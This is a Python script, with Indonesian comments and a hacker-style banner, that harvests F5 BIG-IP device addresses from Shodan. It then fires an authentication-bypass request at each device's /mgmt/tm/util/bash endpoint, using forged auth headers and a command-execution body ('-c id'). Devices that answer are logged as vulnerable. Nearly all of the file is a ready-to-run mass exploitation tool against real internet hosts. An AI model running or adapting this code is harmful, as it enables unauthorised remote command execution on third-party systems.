import shodan
import requests
import json
import urllib3
import random
import asyncio
import aiohttp
import logging
import csv
from colorama import Fore

# Kunci API Shodan
SHODAN_API_KEY = "YOUR_SHODAN_API_KEY"  # pastikan mengisi kunci api shodan dengan benar
api = shodan.Shodan(SHODAN_API_KEY)  # inisialisasi objek shodan dengan kunci api

# Banner
banner = """


┏┏━  ┳┓•  ┳┏┓  ┏┓           
╋┗┓  ┣┫┓┏┓┃┃┃  ┗┓┏┏┓┏┓┏┓┏┓┏┓
┛┗┛  ┻┛┗┗┫┻┣┛  ┗┛┗┗┻┛┗┛┗┗ ┛
 
Kode ini Dibua Oleh:Yoga913
                                                      by: Yoga913
"""

# menampilkan banner di terminal dengan warna cyan
print(f"{Fore.CYAN}{banner}")

# Daftar User-Agent untuk mengacak header request
useragent_list = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36"
]

# Headers untuk permintaan POST http
headers = {
    "User-Agent": random.choice(useragent_list),
    'Content-Type': 'application/json',
    'Connection': 'keep-alive',  # Hapus 'x-F5-Auth-Token' dari header 'Connection'
    'X-F5-Auth-Token': 'abc',  # Token otorisasi (place holder)
    'Authorization': 'Basic YWRtaW46'  # Otorisasi dasar (place holder)
}

# Data untuk permintaan POST, Data yang dikirimkan ke server F5 BIG-IP untuk menjalankan perintah 'id'
data = {'command': "run", 'utilCmdArgs': "-c id"}

# Logging konfigurasi
logging.basicConfig(filename='scanner.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Fungsi untuk menyimpan hasil dalam CSV
def save_to_csv(ip, status):
    with open('f5bigip_results.csv', mode='a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([ip, status])

# Fungsi untuk memindai kerentanan
async def scan_vulnerability(session, ip_address):
    url = f"https://{ip_address}/mgmt/tm/util/bash"
    try:
        async with session.post(url, json=data, headers=headers, ssl=False, timeout=5) as response:
            if response.status == 200 and 'commandResult' in await response.text():
                logging.info(f"VULNERABLE: {ip_address}")
                save_to_csv(ip_address, "VULNERABLE")
                print(f"{Fore.GREEN}VULNERABLE: {Fore.CYAN}{url}")
            else:
                logging.info(f"NOT VULNERABLE: {ip_address}")
                save_to_csv(ip_address, "NOT VULNERABLE")
                print(f"{Fore.RED}NOT VULNERABLE: {url}")
    except aiohttp.ClientError as e:
        logging.error(f"Client error on {ip_address}: {e}")
    except asyncio.TimeoutError:
        logging.error(f"Timeout on {ip_address}")

# Fungsi utama untuk mencari perangkat rentan menggunakan API Shodan
async def main():
    try:
        # Melakukan pencarian di Shodan untuk perangkat F5 BIG-IP yang rentan
        results = api.search('http.title:"BIG-IP&reg;-+Redirect" +"Server" product:"F5 BIG-IP"')
        ips = [result['ip_str'] for result in results['matches']]  # daftar untuk menyimpan alamat ip dengan hasil pencarian
        
        # Menyimpan alamat IP ke dalam file "f5bigip.txt"
        with open("f5bigip.txt", "w") as f:
            for ip_address in ips:
                f.writelines(f"{ip_address}\n")  # Menulis setiap ip ke file
        
        # Memulai sesi aiohttp
        async with aiohttp.ClientSession() as session:
            tasks = [scan_vulnerability(session, ip) for ip in ips]
            await asyncio.gather(*tasks)
    
    except shodan.APIError as e:
        logging.error(f"Shodan API Error: {e}")
        print(f"Error: {e}")

# Menjalankan fungsi utama
if __name__ == "__main__":
    asyncio.run(main())
